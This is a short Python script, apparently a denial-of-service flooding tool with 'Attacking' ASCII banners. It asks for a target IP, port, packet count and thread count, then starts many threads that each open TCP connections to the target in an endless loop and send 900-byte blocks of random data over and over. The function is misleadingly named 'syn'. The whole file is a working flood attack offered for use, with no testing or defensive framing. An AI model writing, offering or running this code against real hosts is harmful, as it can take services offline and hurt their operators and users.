import random
import threading
import socket
import pip
import os
import sys
import subprocess
import time

subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'termcolor'])
from termcolor import colored
os.system('cls')
print(colored("""
 __  __ _       _     _   _                         
|  \/  (_)_ __ | |__ | | | | ___   __ _ _ __   __ _ 
| |\/| | | '_ \| '_ \| |_| |/ _ \ / _` | '_ \ / _` |
| |  | | | | | | | | |  _  | (_) | (_| | | | | (_| |
|_|  |_|_|_| |_|_| |_|_| |_|\___/ \__,_|_| |_|\__, |
                                              |___/ 
""",'green'))

ip = str(input(colored("_IP: ",'green')))
port = int(input(colored("_Port: ",'green')))
packet = int(input(colored("_Packet: ",'green')))
thread = int(input(colored("_Threads: ", 'green')))
time.sleep(1)

os.system('cls')
print(colored("""
    |       .     .                   '||       ||                   . . . 
   |||    .||.  .||.   ....     ....   ||  ..  ...  .. ...     ... .       
  |  ||    ||    ||   '' .||  .|   ''  || .'    ||   ||  ||   || ||        
 .''''|.   ||    ||   .|' ||  ||       ||'|.    ||   ||  ||    |''         
.|.  .||.  '|.'  '|.' '|..'|'  '|...' .||. ||. .||. .||. ||.  '||||.       
                                                             .|....'       
""",'green'))

print(colored("###########################################################################",'green'))

def syn():
    num = random._urandom(900)
    count = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(num)
            for i in range (packet):
                h.send(num)
            count += 1
            print(colored(">>>> Sent "+str(count),'green'))
        except KeyboardInterrupt:
            h.close()
            print(colored(">>>>>>>>>>> STOPPED <<<<<<<<<<<< "))
            pass
            
for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()